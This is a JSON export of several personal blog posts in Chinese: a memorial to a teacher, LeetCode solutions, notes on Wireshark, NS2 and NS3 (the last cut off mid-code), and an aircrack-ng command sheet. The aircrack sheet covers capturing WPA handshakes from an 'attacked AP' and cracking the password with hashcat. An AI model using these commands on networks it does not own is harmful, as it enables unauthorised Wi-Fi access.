[{"title":"纪念老许","date":"2022-01-10T12:51:46.000Z","date_formatted":{"ll":"Jan 10, 2022","L":"01/10/2022","MM-DD":"01-10"},"updated":"2022-01-10T15:22:40.865Z","content":"纪念老许1月3号早上，妈妈的电话把我从睡梦中叫醒，我听到的却是老许离世的消息。\n不过约莫20小时前我和老许相互发的最后一条微信还是——新年快乐。老许确诊患癌已经快一年了，听到这样的消息我还是难以接受，却又因为他终于摆脱了癌症的剧痛而替他感到解脱。在忙完上一周的期末之后，我决定写下这篇文章，将我对老许的记忆尘封在这里。\n老许是我整个中学阶段的英语老师，是我最敬爱的老师之一。我们都叫他老许，看似有点不敬，其实是因为他对每个学生都如朋友一般。我们大家庭的孩子基本都被送到老许家补英语，我的哥哥姐姐们，我，我的妹妹都在他家学，甚至我的弟弟也规划好了“以后就送去老许家”。对于我个人来说，我成长阶段的许多朋友、师兄师姐、所见所闻，都离不开老许。\n听说在最开始的时候，老许开过数学补习班，后来转行教了英语。因为精力原因，老许只招收初二初三、高二高三的学生，学生会多到一个客厅挤40来个人，大桌子坐不下坐小桌子，再坐不下挤沙发，甚至人最多的时候挤到卫生间门口，即便学生们人挤人，大家还是会在老许的幽默课堂上开怀大笑。有了我姐姐在老许家补课的好口碑，我在初一暑假被顺理成章地领去了。第一节课我就坐在老许右手第二个位子，这里从此成了我整个中学阶段的专属座位，位子的特殊性在于，只要我回答错问题或者乱接话，老许随便一抬手就能用笔敲我脑袋。第一堂课结束之后，老许便把我和汪雨晨留了下来，他看了我们的单词听写，说我俩字写得不错，拿出师姐们的作文给我俩看，甚至后来，他还把我的听写本也给师兄师姐们看，听说了这事之后我既羞愧又紧张。\n老许对我的好，是一篇文章里写不完的。最让我难以忘怀的是一件小事，初中的时候我喜欢海绵宝宝，社交网络的头像都是海绵宝宝动漫形象，恰好有段时间我没在他家补课，老许看到后，特地在QQ上跟我说，他有一张海绵宝宝的贴纸，给我留着。大约过了一个学期，我去他家，进门第一件事他便从门口的柜子上拿起那张海绵宝宝的贴纸给我，非常精美，我收藏在自己的柜子里一直不舍得贴，只是后来搬家时找不到了。老许以前不收高一学生，所以我高一就没有补习英语，但他在给高二高三的师兄师姐们讲虚拟语气、定语从句时，还特地叫我去旁听，我也因此认识了几个优秀的师兄师姐。\n我在读中学时，每当寒暑假上大学的师兄师姐们回来看老许时，他就会整各种花样的好吃的请他们吃，我特别羡慕却还“不够格”，等我上了大学回家后，也成了去老许家蹭吃蹭喝的一员。特别是在老许有得意弟子来他家时，他也会特地叫我也去认识认识优秀的师姐们。我家离老许家特别近，步行两分钟的距离。\n老许的博学一直是我可望而不可及的高度。他教过数学，后来以教英语营生，自学考了翻译证书，还经常在英语课上给我们畅聊古今。他和学艺术的同学聊戏曲，和学汉语言的师姐聊地方文化，和学计算机的师兄聊《第一行代码：Android》，和我们显摆他又淘到了一台二手无线电设备，仿佛没有什么知识是他接不上来的。他家的电视永远播着卫星收看的外国频道，家里布满最新的智能物联网小玩意儿。上大学后，每次去他家都会发现新的新奇物品。\n老许的坚强、乐观不是一般人能感受的到的。他和我妈妈都是在钢铁厂长大的，听大人说，他的父亲在他幼时就工伤去世了。他又有遗传性的血友病，缺乏凝血因子，从小与疾病为伴。记得老许和我们说他和小小的故事。小小是陪他长大的一只小白狗，他在十几岁时，就因为血友病带来的并发症导致关节脆弱，卧床不起。他觉得自己还年轻，不能一辈子就躺在床上，于是努力地站起来扶着走路，小小就一直在他的身边陪着他，从不走远。后来小小也离世了，但照片一直在他书房的书架上最显眼的位置。我也是因为老许，对于血友病这样一种罕见病有所了解。老许每隔固定的时间就要注射凝血因子，他说他的胳膊上满是针眼，甚至出去会被不了解的人另眼相待。给我们上课的时候，老许偶尔会关节疼痛加重，没有办法坐着给我们讲课，却又不忍心给我们停课，就只能躺在沙发上讲。但他声音永远沉着、清晰、声如洪钟，即使是2021年暑假我们去医院看他时，他的声音也一点没变。\n老许从没在我们面前表现过任何一丝疾病的痛苦，我甚至无法从他的表情上看到癌症的剧痛。我们去医院看他时，他平静地跟我们说吗啡用量已经加倍又加倍，平静地从抽屉中拿出药交给他母亲给他注射，熟练的已经不需要护士。即使我们交流很多，他也从未和我透露过他的病痛，从来只是报喜不报忧。\n2020年，虽然是疫情爆发的一年，却是我们认为老许最充满希望、最快乐的一年，他用上了罗氏的新药。这个新药要40万一年，全中国也没几个血友病患者能用得起。许多血友病患者家庭早就因病致贫，心力憔悴。老许却和他的血友病相处了四十多年，不仅没有被打倒，反而靠自己的才华和技能开设英语班，有了用得起药的积蓄。他说，用了罗氏的新药就可以过上近似正常的人的生活了，在国外有成功的先例，国外有血友病患者已经可以游泳、骑自行车了！我们听了都激动万分。新药每次从上海专车运抵安徽，到达我们县城的医院，再由“都认识他了”的护士姐姐给他注射。这一年我们眼看着老许在朋友圈分享自己一天破万的步数，学游泳、买动感单车、练小哑铃、一个人坐飞机出远门等等。他说，不管这个药他能用多久，他就是想体验一下正常人的生活。\n同为血液病，白血病比血友病受到的公众关注度要大得多。老许自己一直是血友病患者QQ大群的群主，他开办公众号，参与医保谈判。有一次他在群里问谁可以帮他做一个表格，清晰地展示罗氏新药的不同年龄段的详细用量，我帮他做了，他放在公众号里。后来他跟我提过三四次，又有患者家属来感谢他，说这个表格做得好，表扬一下我。可是我能做的也只有这些。\n在2021年老许正式告诉我他已经患癌时，我在学校的宿舍大哭。我时常感叹老天的不公，为什么老许已经这么努力地与命运抗争了，却还是要持续地给他以病痛和折磨。再假使，如果不是赶上疫情，老许在确诊患癌后十分想去美国的安德森癌症中心治疗，我去他家时，他的桌上已经摆着医护英语用书了，却听他说办不下来签证。上海出过一个新闻，说出了200万一针的癌症治疗针，他去打听了，不适用于胰腺癌。最近一次去他家是中秋，他说上海有个癌症患者的治疗方法是抽血杀掉癌细胞再注射回身体，他联系了上海的医院，医生说他们也正希望把新的治疗方法在胰腺癌上试验。但后来从我姐姐口中得知，这条路也行不通。即使是对于癌症，他也只会乐观地告诉我们，他正在寻找什么样的新方法，还有希望。然而他那么努力地寻找希望，老天却决然掐断了所有的通道。\n我还在学校没有放假，他离世的时候我正在期末考试，甚至无法回家送他。听妈妈说，有几个上班的师兄师姐请假回家了，还有很多父母代替孩子来送别老许。对于我来说，放假去老许家、奶奶家、外公外婆家是必做的三件事，现在心里却真真正正少了一块。老许洪亮的声音还依然清晰地在我的脑海中，他的博学、坚强、乐观已经刻在了我的成长印记中。\n","thumbnail":"https://s4.ax1x.com/2022/01/10/7ZkCKH.jpg","plink":"https://yuyuoo.github.io/2022/01/10/纪念老许/"},{"title":"leetcode中等题","date":"2021-11-04T12:14:57.000Z","date_formatted":{"ll":"Nov 4, 2021","L":"11/04/2021","MM-DD":"11-04"},"updated":"2021-11-04T13:28:48.150Z","content":"题目一： 二维数组中的查找题目描述：在一个 $n * m$的二维数组中，每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个高效的函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。\n示例： 现有矩阵 $matrix$​​ 如下:\n$\\left[\n\\matrix{\n  1&amp;4&amp;7&amp;11&amp;15\\\n  2&amp;5&amp;8&amp;12&amp;19\\\n  3&amp;6&amp;9&amp;16&amp;22\\\n  10&amp;13&amp;14&amp;17&amp;24\\\n  18&amp;21&amp;23&amp;26&amp;30\\\n}\n\\right]$​​​​​\n给定 $target=5$​，返回 $true$​。\n给定 $target = 20$​，返回 $false$​。\n限制：  \n$0 &lt;= n &lt;= 1000$$0 &lt;= m &lt;= 1000$题解：\n算法思路：\n从二维数组的右上角开始往左或往下查找。因为对于每个元素来说，左边的值都比自己小，下面的值都比自己大。因此如果当前元素大于目标值，往左查找；如果当前元素小于目标值，往下查找。\n时间复杂度：$O(n+m)$。往下查找最多走 n 次，往左查找最多走 m 次，因此循环体最多执行 n + m 次。空间复杂度：$O(1)$伪代码：\n123456789101112131415if (matrix[] &#x3D;&#x3D; NULL)\t\tthen return FALSEend ifrow ← 0col ← colnum -1repeat\t\tif (target &lt; matrix[row,col] &amp;&amp; col &gt; 0)\t\t\t\tthen col ← col - 1\t\t\t\telse if(target &gt; matrix[row,col] &amp;&amp; row &lt; rownum-1)\t\t\t\t\t\tthen row ← row + 1\t\tend ifuntile target &#x3D;&#x3D; matrix[row,col]if (target !&#x3D; matrix[row,col])\t\tthen return FALSE\t\telse return row,col\n\n代码：\n12345678910111213141516171819202122232425262728class Solution &#123;public:    bool findNumberIn2DArray(vector&lt;vector&lt;int&gt;&gt;&amp; matrix, int target) &#123;        if(matrix.size() == 0 || matrix[0].size() == 0)        &#123;            return false;        &#125;        int rownum = matrix.size();        int colnum = matrix[0].size();        int row = 0;        int col = matrix[0].size() - 1;        while(row &lt;= rownum-1 &amp;&amp; col &gt;= 0)        &#123;            if(target &lt; matrix[row][col] &amp;&amp; col &gt; 0)            &#123;                col--;            &#125;            else if(target &gt; matrix[row][col] &amp;&amp; row &lt; rownum-1)            &#123;                row++;            &#125;            else break;        &#125;        if(target == matrix[row][col])            return true;        else return false;    &#125;&#125;;\n\n\n\n题目二： 前 K 个高频元素题目描述： 给你一个整数数组$nums$和一个整数$k$，请你返回其中出现频率前$k$高的元素。你可以按任意顺序返回答案。\n示例 1：\n输入：$nums = [1, 1, 1, 2, 2, 3], k = 2$​​\n输出：$[1, 2]$​\n示例 2：\n输入：$nums = [1], k = 1$​​\n输出：$[1]$​\n提示：\n$1 &lt;= nums.length &lt;= 10^5$$k$ 的取值范围是$[1, \\rm{数组中不相同的元素的个数}]$题目数据保证答案唯一，换句话说，数组中前$k$个高频元素的集合是唯一的题解：\n算法思路：\n先遍历一遍数组，用一个哈希表记录每个元素出现的次数。建立一个小顶堆，保持小顶堆中只有k对&lt;元素，出现次数&gt;。遍历哈希表中的每一对\n如果小顶堆中不足k对，直接插入堆如果小顶堆中已有k对，哈希表中当前对和小顶堆的堆顶比较出现次数，如果哈希表中当前更小，说明已经有至少k对比它出现次数多，舍弃，否则要弹出堆顶，将哈希表中当前对加入堆。伪代码：\n12\n\n代码：\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546class Solution &#123;public:    struct occur_heap&#123;        pair&lt;int, int&gt; m;   //pair 的第一个元素代表数组的值，第二个元素代表了该值出现的次数        bool operator &lt; (const occur_heap &amp;oh) const &#123; //默认优先队列是大顶堆，这里指定排序方式，改为根据m.second排序的小顶堆            return m.second &gt; oh.m.second;        &#125;    &#125;;    vector&lt;int&gt; topKFrequent(vector&lt;int&gt;&amp; nums, int k) &#123;        unordered_map&lt;int, int&gt; occurrences;        for(auto&amp; v : nums)        &#123;            occurrences[v]++;        &#125;        priority_queue&lt;occur_heap&gt; pq;        for(auto&amp; [num, count] : occurrences)        &#123;            if(pq.size() == k)            &#123;                if(pq.top().m.second &lt; count)                &#123;                    pq.pop();                    struct occur_heap n;                    n.m.first = num;                    n.m.second = count;                    pq.push(n);                &#125;            &#125;            else            &#123;                struct occur_heap n;                n.m.first = num;                n.m.second = count;                pq.push(n);            &#125;        &#125;        vector&lt;int&gt; ret;        while(!pq.empty())        &#123;            ret.push_back(pq.top().m.first);            pq.pop();        &#125;        return ret;    &#125;&#125;;\n\n题目一：不同路径 II题目描述：一个机器人位于一个 m x n 网格的左上角 （起始点在下图中标记为“Start” ）。\n机器人每次只能向下或者向右移动一步。机器人试图达到网格的右下角（在下图中标记为“Finish”）。\n现在考虑网格中有障碍物。那么从左上角到右下角将会有多少条不同的路径？\n\n网格中的障碍物和空位置分别用 1 和 0 来表示。\n示例： \n\n1234567输入：obstacleGrid &#x3D; [[0,0,0],[0,1,0],[0,0,0]]输出：2解释：3x3 网格的正中间有一个障碍物。从左上角到右下角一共有 2 条不同的路径：1. 向右 -&gt; 向右 -&gt; 向下 -&gt; 向下2. 向下 -&gt; 向下 -&gt; 向右 -&gt; 向右\n\n题解：\n算法思路：\n简单描述算法的求解思路\n伪代码：\n12\n\n代码：\n","plink":"https://yuyuoo.github.io/2021/11/04/leetcode中等题/"},{"title":"在jetson nano上使用aircrack","date":"2021-02-19T09:51:48.000Z","date_formatted":{"ll":"Feb 19, 2021","L":"02/19/2021","MM-DD":"02-19"},"updated":"2021-02-19T10:05:11.020Z","content":"常用命令：设置网卡 monitor 模式：\n123fconfig wlan1 downiwconfig wlan1 mode monitorifconfig wlan1 up\n\n设置网卡监听模式（创建虚接口 mon0）:\n1airmon-ng start wlan0 11 (11 表示信道)\n\n关闭虚接口和设置信道：\n12airomon-ng stop mon0iwconfig wlan1 channel 10\n\n用 wlan0 或者虚接口扫描周围的热点和终端：\n12airodump-ng wlan0airodump-ng wlan0 -w 1.pcap\t#可抓握手包\n\n抓指定 ap 的握手包：\n1airodump-ng -w wpa1.cap --bssid 被攻击 AP 的 MAC --channel 11（信道号）wlan0（抓包的网卡）\n\ntcpdump 指定时间或者指定大小进行循环抓取报文：\n12tcpdump -i eth3 -s0 -G 60 -Z root -w % Y_% m% d_% H% M_% S.pcap #60 秒tcpdump -i eth3 -s0 -C 1 -Z root -w jiangsuyinhang.pcap #一兆\n\neditcap  裁剪包：\n12345678editcap -A '2014-12-10 10:11:01' -B '2014-12-10 10:21:01' input.pcap output.pcap#\"- A &lt;start-time&gt; 和\" - B &lt; end-time &gt; 选项可以过滤出在这个时间段到达的数据包（如，从 2:30 ～ 2:35）时间的格式为 \"YYYY-MM-DD HH:MM:SS\"editcap input.pcap output.pcap 401-500#从 input.pcap 文件中提取 100 个包（从 401 到 500）并将它们保存到 output.pcap 中editcap -D 10 input.pcap output.pcap#使用 \"-D &lt;dup-window&gt;\" （dup-window 可以看成是对比的窗口大小，仅与此范围内的包进行对比）选项可以提取出重复包\n\n12editcap -c &lt;packets-per-file&gt; &lt;input-pcap-file&gt; &lt;output-prefix&gt;#将一个 pcap 文件分割成数据包数目相同的多个文件\n\n12editcap -i &lt;seconds-per-file&gt; &lt;input-pcap-file&gt; &lt;output-prefix&gt;#将一个 pcap 文件分割成秒数相同的多个文件\n\n12mergecap -w output.pcap input.pcap input2.pcap [input3.pcap . . .]#当合并多个文件时，mergecap 默认将内部的数据包以时间先后来排序\n\n12mergecap -a -w output.pcap input.pcap input2.pcap#将 input.pcap 文件的内容写入到 output.pcap, 并且将 input2.pcap 的内容追加在后面\n\nhashcat 破解握手包密码：\n12345aircrack-ng &lt;input.cap&gt; -J &lt;out.hccap&gt;#用 aircrack-ng 把 cap 转换成 hccap 类型数据包hashcat -m 2500 testap.hccap pass.txt#用 hashcat 破解 WPA/PSK 密码（ -m 2500 为破解的模式为 WPA/PSK 方式）\n\nairodump-ng抓包工具usage: airodump-ng&lt;options&gt;&lt;interface&gt;[,&lt;interface&gt;,...]\nOptions:\n-i,-ivs: 仅将抓取信息保存为.ivs(只对破解有用).-w&lt;prefix&gt;, -write&lt;prefix&gt;: 保存为指定日文件名，我一般用这个，尤其是多个网络时，指定了也好区分-e, –beacons: 保存所有的 beacons, 默认情况况下是丢弃那些无用的数据包的-g,–gpsd: 指示 airodump-ng 应该尝试使用 GPSd 获取坐标–showack: 打印 ACK / CTS / RTS 统计数据。有助于调试和一般的注入优化。允许探测 “隐藏” 的站，因为它们太远，无法捕获高比特率帧，因为 ACK 帧以每秒 1Mbps 的速度发送。-h: 隐藏的站点.-c &lt;channel&gt;[,&lt;channel&gt;[,…]],–channel &lt;channel&gt;[,&lt;channel&gt;[,…]]: 指出要监听的频道。默认情况下，airodump-ng 在所有 2.4GHz 通道上跳转。-r &lt;file&gt;: 从文件中读取数据包-x &lt;msecs&gt;: 主动扫描模拟 (发送探测请求并解析探测响应)-M,–manufacturer: 显示一个制造商列，其中包含从 IEEE OUI 列表获得的信息Filteroptions:\n-encrypt&lt;suite&gt;: 使用密码序列过滤 AP,只显示与给定加密匹配的网络-m &lt;mask&gt;,-netmask&lt;netmask&gt;: 使用掩码过滤 AP-d &lt;bssid&gt;, -bssid&lt;bssid&gt;: 使用 bssid 过滤 AP,它将只显示与给定 bssid 匹配的网络。-a: 过滤无关的客户端如果你有一个连接到电脑的 GPS 接收器，airodump-ng 可以记录下找到的接入点的坐标。此外，airodump-ng 会写出一个文本文件，其中包含所看到的所有访问点和客户机的详细信息。\n一个例子：执行命令\nroot@sch01ar:~# airodump-ng wlan0mon\n\nBSSID AP 的 MAC 地址。如果在 client section 中 BSSID 显示为 “（not associated）”，那么意味着该 客户端没有和 AP 连接上。unassociated 状态下，它正在搜索能够连接上的 AP。\nPWR  网卡报告的信号水平，它主要取决与驱动，当信号值越高时说明你离 AP 或电脑越近。如果一个 BSSID 的 PWR 是 - 1，说明网卡的驱动不支持报告信号水平。如果是部分客户端的 PWR 为 - 1，那么说明该客户端不在你网卡能监听到的范围内，但是你能捕捉到 AP 发往该客户端的数据。如果所有的客户端 PWR 值都为 - 1，那么说明网卡驱动不支持信号水平报告。\nRXQ 接收质量，它用过去 10 秒钟内成功接收到的分组（管理和数据帧）的百分比来衡量。\nBeacons AP 发出的信标编号，每个接入点（AP）在最低速率（1M）时差不多每秒会发送 10 个左右的 beacon，所以它们能在很远的地方就被发现。\n#Data 被捕获到的数据分组的数量（如果是 WEP，则代表唯一 IV 的数量），包括广播分组。\n#/s 过去 10 秒钟内每秒捕获数据分组的数量\nCH  信道号（从 beacon 中获取）\nMB AP 所支持的最大速率，如果 MB=11，它是 802.11b，如果 MB=22，它是 802.11b+，如果更高就是 802.11g。后面的点（高于 54 之后）表明支持短前导码（short preamble）。\nENC 使用的加密 算法体系。OPN = 无加密， “WEP?”=WEP 或者更高（没有足够的数据来选择（WEP 与 WPA/WPA2）），WEP（没有问号）表明静态或动态 WEP，如果出现 TKIP 或 CCMP，那么就是 WPA/WPA2。\nCIPHER 检测到的加密算法，CCMP，WRAAP，TKIP，WEP，WEP40 或者 WEP104 中的一个。典型的来说（不是一定的），TKIP 与 WPA 结合使用，CCMP 与 WPA2 结合使用。\nAUTH 使用的认证 协议。 以下的其中一种：MGT（WPA/WPA2 使用独立的认证服务器，平时我们常说的 802.1x，radius，eap 等），SKA（WEP 的共享密钥），PSK（WPA/WPA2 的预共享密钥），或者  OPN（WEP 开放式）\nESSID 所谓的 “SSID”，如果启用 隐藏 SSID 的话它可以为空，这种情况下 airodump-ng 试图从 probe responses 和 association requests 中获取 ssid\nSTATION 客户端的 MAC 地址，包括连上的和想要搜索 AP 来连接的客户端。如果客户端没有连接上，就在 BSSID 下显示 “not associated”\nLost 在过去 10 秒钟内丢失的数据分组，基于序列号检测。\nProbes 被客户端查探的 ESSID。如果客户端正试图连接一个 AP 但是没有连接上，那么就显示在这里。\n使用airodump抓包流程：airmon-ng start wlan0 开启monitor模式airodump-ng wlan0mon 全网扫描，wlan0mon是接口，看到我家路由器在信道3airmon-ng start wlan0 3开始抓包生成cap文件：airodump-ng -c 3 -w test --output-format pcap wlan0mon停止捕获（停止监视模式）：sudo airmon-ng stop wlan0mon","thumbnail":"https://i.loli.net/2021/02/19/XpIrA57YEWGQmUe.png","plink":"https://yuyuoo.github.io/2021/02/19/在jetson-nano上使用aircrack/"},{"title":"Capturing 802.11ax with the Jetson Nano","date":"2021-01-14T09:23:03.000Z","date_formatted":{"ll":"Jan 14, 2021","L":"01/14/2021","MM-DD":"01-14"},"updated":"2021-01-21T09:09:51.333Z","content":"使用Jetson Nano捕获802.11包在 Jetson Nano 上安装 WiresharkInstall Wireshark on Ubuntu 20.04|18.04|16.04：Add PPA repository and install Wireshark.123sudo add-apt-repository ppa:wireshark-dev&#x2F;stable sudo apt updatesudo apt -y install wireshark\n\n​        When asked whether to allow non-superusers to capture packets, select your option and finish the installation.\nCheck installed Wireshark version:wireshark --versionConfigure and start Wireshark To be able to capture packets as normal user, add your user to wireshark group.sudo usermod -a -G wireshark $USER1​        Also change dumpcap binary file permissions.\n123sudo chgrp wireshark &#x2F;usr&#x2F;bin&#x2F;dumpcapsudo chmod 750 &#x2F;usr&#x2F;bin&#x2F;dumpcapsudo setcap cap_net_raw,cap_net_admin&#x3D;eip &#x2F;usr&#x2F;bin&#x2F;dumpcap\n​        Verify:\n1sudo getcap &#x2F;usr&#x2F;bin&#x2F;dumpcap\n​    输出/usr/bin/dumpcap = cap_net_admin,cap_net_raw+eip\nStarting Wireshark search for wireshark and hit the enter button.The same can be done from command line by typing:wireshark​        To test packets capturing, select interface to use and click “Start capturing packets” button\n安装 aircrack：sudo apt-get install aircrack-ng网卡开启monitor模式：sudo airmon-ng start wlan0sudo airodump-ng -w yuyu wlan0mon全网扫描，yuyu是随便写的保存的文件名，wlan0mon是接口，运行后看到我家AP在信道11指定11信道：sudo airmon-ng start wlan0 11启动 Wireshark 并选择 wlan0mon 接口。停止捕获（停止监视模式）：sudo airmon-ng stop wlan0mon","thumbnail":"https://s3.ax1x.com/2021/01/14/sdeOfg.png","plink":"https://yuyuoo.github.io/2021/01/14/Capturing-802-11ax-with-the-Jetson-Nano/"},{"title":"在NS2中添加一个新协议的步骤","date":"2020-12-16T11:59:29.000Z","date_formatted":{"ll":"Dec 16, 2020","L":"12/16/2020","MM-DD":"12-16"},"updated":"2020-12-16T12:18:07.118Z","content":"NS2的安装根据网上的教程，安装在ubuntu16.04。环境部署好之后，无论在哪个文件夹下输入ns命令，回车，都会出现一个%开头。\nNS2与NS3不同，协议的源代码在ns2.35文件夹下，这些存了C文件的子文件夹是ns2自带的协议，如AOMDV、AODV等等。\n我们添加的新协议名字是teaomdv，将新协议的代码写好后，需要需要ns2.35文件夹下几处地方。\n在common/packet.h中：\n添加1static const packet_t PT_TEAOMDV = 73;\n\n修改最后PT_NTYPE的值为74。\n添加1type == PT_TEAOMDV\n\n添加1name_[PT_TEAOMDV] = \"TEAOMDV\"\n\n添加12// TEAOMDV patchint teaomdv_salvage_count_;\n\n\n\n在trace/cmu-trace.cc中：\n添加1#include &lt;teaomdv/teaomdv_packet.h&gt; //TEAOMDV\n\n添加CMUTrace::format_xxx(Packet *p , int offest) 函数，内容参考 format_aomdv 函数的在 void CMUTrace::format(Packet* p, const char *why) 函数中参照 aomdv 的写法添加1234// TEAOMDV patchcase PT_TEAOMDV:\tformat_teaomdv(p, offset);\tbreak;\n\n\n\n在trace/cmu_trace.h中：\n添加void format_teaomdv(Packet *p, int offset);到class CMUTrace中。在queue/priqueue.cc中：\n在 case PT_AOMDV 下面添加 case PT_TEAOMDV:在tcl/lib/ns-packet.tcl中：\n搜索 AOMDV，然后在 AOMDV 的下面添加\n 12# TEAOMDV patchTEAOMDV\n\n表示声明。\n在tcl/lib/ns-lib.tcl中：\n添加123TEAOMDV &#123;\t\t\t    set ragent [$self create-teaomdv-agent $node]\t\t    &#125;\n\n添加1234567# TEAOMDV patchSimulator instproc create-teaomdv-agent &#123; node &#125; &#123;\tset ragent [new Agent/TEAOMDV [$node node-addr]]\t$self at 0.0 \"$ragent start\"\t$node set ragent_ $ragent\treturn $ragent&#125;\n\n\n\n在tcl/lib/ns-mobilenode.tcl中：\n为了设置协议的混杂模式，添加：12345# Special processing for TEAOMDV\tset teaomdvonly [string first \"TEAOMDV\" [$agent info class]] \tif &#123;$teaomdvonly != -1 &#125; &#123;\t\t$agent if-queue [$self set ifq_(0)]   ;# ifq between LL and MAC\t&#125;\n\n\n\n在makefile中添加\n12teaomdv&#x2F;teaomdv_logs.o teaomdv&#x2F;teaomdv.o \\teaomdv&#x2F;teaomdv_rtable.o teaomdv&#x2F;teaomdv_rqueue.o \\\n\n然后在ns2.35文件夹下输入命令：\n1make file&amp;&amp;make\n\n没有报错就成功了。\n在ns2.35/tcl文件夹下是所有的tcl文件，可以用于设置仿真环境。\n根据需要编写awk脚本用于分析tcl文件运行生成的.tr文件也就是trace数据流。得到的结果是我们提取出的数字，编写与ns3类似的画图脚本，用gnuplot命令画图就可以得到相应的折线、曲线图。\n","thumbnail":"https://s3.ax1x.com/2020/12/16/r1GcWD.jpg","plink":"https://yuyuoo.github.io/2020/12/16/在NS2中添加一个新协议的步骤/"},{"title":"利用NS3部署不同拓扑无线网络","date":"2020-11-13T08:48:59.000Z","date_formatted":{"ll":"Nov 13, 2020","L":"11/13/2020","MM-DD":"11-13"},"updated":"2020-11-26T08:56:10.833Z","content":"在开始之前，首先在ubuntu16.04上安装好了ns3，过程来源于网上的教程。然后将examples/tutorial文件夹下的示例代码逐一学习了一遍。\n这里粘贴一下前三个程序的代码及注释：\nfirst.cc模拟了两个节点，一个server和一个client：\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990/* -*- Mode:C++; c-file-style:\"gnu\"; indent-tabs-mode:nil; -*- *//* * This program is free software; you can redistribute it and/or modify * it under the terms of the GNU General Public License version 2 as * published by the Free Software Foundation; * * This program is distributed in the hope that it will be useful, * but WITHOUT ANY WARRANTY; without even the implied warranty of * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the * GNU General Public License for more details. * * You should have received a copy of the GNU General Public License * along with this program; if not, write to the Free Software * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA */#include \"ns3/core-module.h\"#include \"ns3/network-module.h\"#include \"ns3/internet-module.h\"#include \"ns3/point-to-point-module.h\"#include \"ns3/applications-module.h\"using namespace ns3;NS_LOG_COMPONENT_DEFINE (\"FirstScriptExample\");intmain (int argc, char *argv[])&#123;  CommandLine cmd;  cmd.Parse (argc, argv);    //确定时间精度  Time::SetResolution (Time::NS);  //打开日志功能  LogComponentEnable (\"UdpEchoClientApplication\", LOG_LEVEL_INFO);  LogComponentEnable (\"UdpEchoServerApplication\", LOG_LEVEL_INFO);  //先声明一个节点容器，然后创建两个节点。  //这种节点是空节点，需要通过下面的配置加入网卡设备、协议栈等功能，实现数据传输  NodeContainer nodes;  nodes.Create (2);  //创建一条点到点线路，PointToPointHelper类 可以很方便的配置链路属性  PointToPointHelper pointToPoint;  pointToPoint.SetDeviceAttribute (\"DataRate\", StringValue (\"5Mbps\"));  pointToPoint.SetChannelAttribute (\"Delay\", StringValue (\"2ms\"));  //给节点加载网卡设备并接入网络  NetDeviceContainer devices;  devices = pointToPoint.Install (nodes);    //给节点加载协议栈  InternetStackHelper stack;  stack.Install (nodes);  //配置ipv4地址域  Ipv4AddressHelper address;  address.SetBase (\"10.1.1.0\", \"255.255.255.0\");  //将ipv4接口加载到网卡上  Ipv4InterfaceContainer interfaces = address.Assign (devices);  //给节点加载应用程序  //配置应用程序服务器端，并配置端口号9  UdpEchoServerHelper echoServer (9);  //将该服务器功能加载到指定节点，并配置服务器开始和结束时间  ApplicationContainer serverApps = echoServer.Install (nodes.Get (1));  serverApps.Start (Seconds (1.0));  serverApps.Stop (Seconds (10.0));  //配置应用程序客户端，interfaces.GetAddress(1)获取服务器节点的ip地址，以及服务器端口号9  UdpEchoClientHelper echoClient (interfaces.GetAddress (1), 9);  //此外还需配置客户端属性，例如包的大小和长度以及发包间隔  echoClient.SetAttribute (\"MaxPackets\", UintegerValue (1));  echoClient.SetAttribute (\"Interval\", TimeValue (Seconds (1.0)));  echoClient.SetAttribute (\"PacketSize\", UintegerValue (1024));  //将客户端功能加载到另一个节点上，同样需要配置客户端开始和结束时间  ApplicationContainer clientApps = echoClient.Install (nodes.Get (0));  clientApps.Start (Seconds (2.0));  clientApps.Stop (Seconds (10.0));  //开启仿真器运行  Simulator::Run ();  Simulator::Destroy ();  return 0;&#125;\n\nsecond.cc模拟了一个n0和一个局域网，局域网与n0间p2p通信\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127/* -*- Mode:C++; c-file-style:\"gnu\"; indent-tabs-mode:nil; -*- */ //Emacs模式行，GPL boilerplate#include \"ns3/core-module.h\"       //#include \"ns3/simulator-module.h\"#include \"ns3/node-module.h\"#include \"ns3/helper-module.h\"// Default Network Topology////       10.1.1.0// n0 -------------- n1   n2   n3   n4//    point-to-point  |    |    |    |//                    ================//                      LAN 10.1.2.0using namespace ns3;NS_LOG_COMPONENT_DEFINE (\"SecondScriptExample\");intmain (int argc, char *argv[])&#123;    bool verbose = true;  //定义变量，用于决定是否开启两个UdpApplication的Logging组件;默认true开启    uint32_t nCsma = 3;   //LAN中另有3个node    CommandLine cmd;    cmd.AddValue (\"nCsma\", \"Number of \\\"extra\\\" CSMA nodes/devices\", nCsma);    cmd.AddValue (\"verbose\", \"Tell echo applications to log if true\", verbose); //命令行参数设置是否开启logging    cmd.Parse (argc,argv);    if (verbose)    &#123;        LogComponentEnable(\"UdpEchoClientApplication\", LOG_LEVEL_INFO);        LogComponentEnable(\"UdpEchoServerApplication\", LOG_LEVEL_INFO);    &#125;    nCsma = nCsma == 0 ? 1 : nCsma;       //三目运算符还可以这样写。。。。    /********************网络拓扑部分************************/    //创建使用P2P链路链接的2个node    NodeContainer p2pNodes;    p2pNodes.Create (2);    //创建另一个NodeContainer类对象，用于总线(CSMA)网络    NodeContainer csmaNodes;    csmaNodes.Add (p2pNodes.Get (1)); //将之前P2P的NodeContianer的第二个节点(索引1)添加到CSMA的NodeContainer，以获得CSMA device;这个node将会有两个device    csmaNodes.Create (nCsma);         //再创建Bus network上另外的node    //设置传送速率和信道延迟，同first.cc    PointToPointHelper pointToPoint;       //注意使用Helper的固定格式：    //1/helper对象声明及属性设置;    //2/devices对象声明及接收helper对象安装方法的返回列表，安装方法的参数为节点对象！    pointToPoint.SetDeviceAttribute (\"DataRate\", StringValue (\"5Mbps\"));    pointToPoint.SetChannelAttribute (\"Delay\", StringValue (\"2ms\"));    //安装P2P网卡设备到P2P网络节点，同first.cc    NetDeviceContainer p2pDevices;    p2pDevices = pointToPoint.Install (p2pNodes);    //类似于P2PHelper，CsmaHelper帮助创建和连接CSMA设备及信道    